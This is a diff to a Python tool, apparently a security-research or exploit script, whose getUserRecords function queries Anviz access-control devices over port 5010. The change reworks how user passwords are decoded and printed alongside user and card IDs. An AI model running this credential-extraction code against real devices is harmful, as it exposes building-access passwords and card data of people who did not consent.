@@ -3,7 +3,7 @@ import anvizCRC
 import struct
 import binascii
 import ipaddress
-
+import codecs
 import time
 
 # Scapy
@@ -260,24 +260,21 @@ def getUserRecords(ip, port=5010, CH=b"\x00\x00\x00\x00"):
 
         counter = 0
         base = 1+counter*12
-        # print("[*] User??: %s" % data[5])
         user_id = data[base+1:(base+5)]
         passwd_len = data[base+5] >> 4
-        passwd = []
-        passwd.append(data[base+5]&0x0F)
-        passwd[1:passwd_len] = data[(base+6):(base+6+int(passwd_len))]
 
-        passwd_decoded = ''.join(chr(i) for i in passwd)
-
-        #passwd = data[(base+6):(base+6+int(passwd_len))]
-        #asswd = bytearray.fromhex(passwd).decode('utf-8')
-
+        # temporary dirty fix for passwd just to make it work
+        passwd = binascii.hexlify(data[(base+5):(base+8)])[1:6] # ignore first 4 bits for password length
+        prepend_bits = bytearray(b'0')
+        password_array = bytearray(passwd)
+        password_array = prepend_bits + password_array
+        passwd = int.from_bytes(codecs.decode(password_array, 'hex'), byteorder="big", signed=True)
         user_id = struct.unpack(">I", user_id)[0]
+
         print("[*] User: %s" % user_id)
         print("[*] Password_len: %s" % passwd_len)
         print("[*] Password: %s" % passwd)
-        # print("[*] Password: %s" % bytes.fromhex(binascii.hexlify(passwd)))
-        # print("[*] Password: %s" % binascii.unhexlify(binascii.hexlify(passwd)))
+        print("[*] Password (Bytes28): %s" % data[base+27])
 
         pwd = data[(base+6):(base+8)]
         card_id = data[(base+9):(base+12)]
